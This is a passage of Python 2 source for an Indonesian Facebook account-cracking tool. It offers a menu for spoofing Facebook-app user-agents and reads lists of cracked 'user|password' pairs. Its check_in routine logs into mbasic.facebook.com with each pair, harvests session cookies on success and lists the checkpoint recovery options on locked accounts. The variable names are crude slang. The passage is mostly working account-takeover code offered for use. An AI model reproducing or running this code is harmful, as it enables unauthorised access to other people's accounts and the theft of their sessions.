        if 'free.facebook.com' in host:
            return crack(uid, pwx, host)
        else:
            return crack(uid, pwx, 'https://free.facebook.com')
def setting_ua():
    print '\n [ Pilih User-Agent Sesuai HP Anda ]\n'
    print ' [1] Xiaomi'
    print ' [2] Samsung'
    print ' [3] Nokia'
    print ' [4] Asus'
    print ' [5] Huawei'
    print ' [6] Manual user-agent'
    ua = raw_input('\n [?] Pilih--=> ')
    if ua == '':
        menu()
    elif ua == '1':
        c_ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        raw_input('\n [+] Mengganti User-Agent Telah Berhasil')
        menu()
    elif ua == '2':
        c_ua = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        raw_input('\n [+] Mengganti User-Agent Telah Berhasil')
        menu()
    elif ua == '3':
        c_ua = 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        raw_input('\n [+] Mengganti User-Agent Telah Berhasil')
        menu()
    elif ua == '4':
        c_ua = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        raw_input('\n [+] Mengganti User-Agent Telah Berhasil')
        menu()
    elif ua == '5':
        c_ua = '[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]'
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        raw_input('\n [+] Mengganti User-Agent Telah Berhasil')
        menu()
    elif ua == '6':
        c_ua = raw_input(' [+] user-agent--=> ')
        if c_ua == '':
            exit('\n [!] Jangan Kosong')
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        raw_input('\n [+] Mengganti User-Agent Telah Berhasil')
        menu()
    else:
        menu()
def cek_opsi():
    print '\n [*] input file (ex: CP/%s.txt)' % tanggal
    files = raw_input(' [?] Nama File--=> ')
    if files == '':
        menu()
    try:
        buka_baju = open(files, 'r').readlines()
    except IOError:
        exit('\n [!] Nama File %s Tidak Ada ' % files)
    print ' [+] Total User Akun--=> \x1b[0;91m%s\x1b[0;97m' % len(buka_baju)
    print ' [*] Tunggu Sedang Proses Ceek Akun'
    for memek in buka_baju:
        kontol = memek.replace('\n', '')
        titid = kontol.split('|')
        print '\n [+] Ceek Akun--=> \x1b[0;93m%s\x1b[0;97m' % kontol.replace('  SETOR--=> ', '')
        try:
            check_in(titid[0].replace('  SETOR--=> ', ''), titid[1])
        except requests.exceptions.ConnectionError:
            pass
    print '\n [!] Ceek Opsi Akun Sudah Selesai'
    raw_input(' [+] pencet enter untuk kembali ke menu ')
    time.sleep(1)
    menu()
def check_in(user, pasw):
    mb = 'https://mbasic.facebook.com'
    ua = 'Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530'
    ses = requests.Session()
    ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'origin': mb, 'content-type': 'application/x-www-form-urlencoded', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'referer': mb + '/login/?next&ref=dbl&fl&refid=8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
    data = {}
    ged = parser(ses.get(mb + '/login/?next&ref=dbl&fl&refid=8', headers={'user-agent': ua}).text, 'html.parser')
    fm = ged.find('form', {'method': 'post'})
    list = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login', 'bi_xrwh']
    for i in fm.find_all('input'):
        if i.get('name') in list:
            data.update({i.get('name'): i.get('value')})
        else:
            continue
    data.update({'email': user, 'pass': pasw})
    run = parser(ses.post(mb + fm.get('action'), data=data, allow_redirects=True).text, 'html.parser')
    if 'c_user' in ses.cookies:
        kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
        run = parser(ses.get('https://free.facebook.com/settings/apps/tabbed/', cookies={'cookie': kuki}).text, 'html.parser')
        xe = [ re.findall('\\<span.*?href=".*?">(.*?)<\\/a><\\/span>.*?\\<div class=".*?">(.*?)<\\/div>', str(td)) for td in run.find_all('td', {'aria-hidden': 'false'}) ][2:]
        print ' [+] aplikasi terhubung ada : ' + str(len(xe))
        num = 0
        for _ in xe:
            num += 1
            print '   ' + str(num) + ' ' + _[0][0] + ', ' + _[0][1]
    elif 'checkpoint' in ses.cookies:
        form = run.find('form')
        dtsg = form.find('input', {'name': 'fb_dtsg'})['value']
        jzst = form.find('input', {'name': 'jazoest'})['value']
        nh = form.find('input', {'name': 'nh'})['value']
        dataD = {'fb_dtsg': dtsg, 'fb_dtsg': dtsg, 'jazoest': jzst, 'jazoest': jzst, 'checkpoint_data': '', 'submit[Continue]': 'Lanjutkan', 'nh': nh}
        xnxx = parser(ses.post(mb + form['action'], data=dataD).text, 'html.parser')
        ngew = [ yy.text for yy in xnxx.find_all('option') ]
        print ' [+] terdapat ' + str(len(ngew)) + ' opsi '
        for opt in range(len(ngew)):
            print ' [' + str(opt + 1) + '] ' + ngew[opt]
    elif 'login_error' in str(run):
        oh = run.find('div', {'id': 'login_error'}).find('div').text
        print ' [!] %s' % oh
    else:
        print ' [!] login gagal, silakan periksa id dan kata sandi Anda lagi'
def buat_folder():
    try:
        os.mkdir('CP')
    except:
        pass
    try:
        os.mkdir('OK')
    except:
        pass
if __name__ == '__main__':
    os.system('git pull')
    os.system('touch login.txt')
    buat_folder()
    login()
# Mau Ngapain Cuk?